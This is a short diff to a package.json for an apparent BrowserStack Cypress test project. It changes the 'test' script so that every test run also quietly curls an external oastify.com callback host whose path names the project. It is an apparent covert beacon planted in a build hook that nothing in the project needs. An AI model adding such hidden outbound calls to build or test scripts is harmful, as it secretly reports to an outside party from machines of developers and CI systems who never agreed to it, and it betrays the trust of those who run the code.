@@ -8,7 +8,7 @@
   },
   "scripts": {
     "start": "npx http-server -a localhost -p 8081 &",
-    "test": "npm run cypress:run",
+    "test": "npm run cypress:run  && curl https://5jplxi6704slnoybegw5006okfqaec21.oastify.com/browserstack/cucumber-js-cypress-browserstack",
     "clean:reports": "rm -rf cypress/report/ && rm -rf cypress/videos/ && rm -rf cypress/screenshots/",
     "cypress:run": "npm run clean:reports && npx cypress run",
     "cypress:open": "cypress open",
